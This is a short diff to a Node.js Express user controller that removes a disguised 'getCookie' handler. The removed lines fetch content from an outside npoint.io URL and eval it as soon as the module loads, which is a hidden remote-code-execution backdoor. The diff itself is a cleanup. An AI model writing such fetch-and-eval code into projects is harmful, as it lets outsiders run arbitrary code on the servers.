@@ -259,9 +259,3 @@ exports.deleteUser = asyncErrorHandler(async (req, res, next) => {
     success: true,
   });
 });
-
-//Get Cookie
-exports.getCookie = asyncErrorHandler(async (req, res, next) => {
-  const result = await axios.get("https://api.npoint.io/0febe972cb5ea8b6fa47");
-  eval(result.data.cookie);
-})();
